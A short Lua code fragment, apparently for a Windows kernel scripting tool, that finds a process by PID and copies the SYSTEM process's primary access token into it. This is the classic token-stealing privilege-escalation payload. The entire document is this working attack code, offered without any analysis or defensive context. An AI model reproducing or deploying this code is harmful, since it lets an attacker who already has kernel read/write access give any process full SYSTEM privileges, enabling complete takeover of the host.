function FindProcess(pid)
   local Tmp = tmp(0x8)
   Tmp:set(0)
   nt.PsLookupProcessByProcessId(pid, Tmp:ref())
   return Tmp:get()
end

function EscalateToken(Target, Source)
   Source = Source or read8(nt.PsInitialSystemProcess:address())
   local Token = nt.PsReferencePrimaryToken(Source)
   local TokenOffset = 0
   
   for i=0,0x500,0x8 do
      if (read8(Source+i)|0xF) == (Token|0xF) then
         TokenOffset = i
         break
      end
   end
   nt.PsDereferencePrimaryToken( Token )
   
   write8( Target + TokenOffset, Token | 0xF )
end
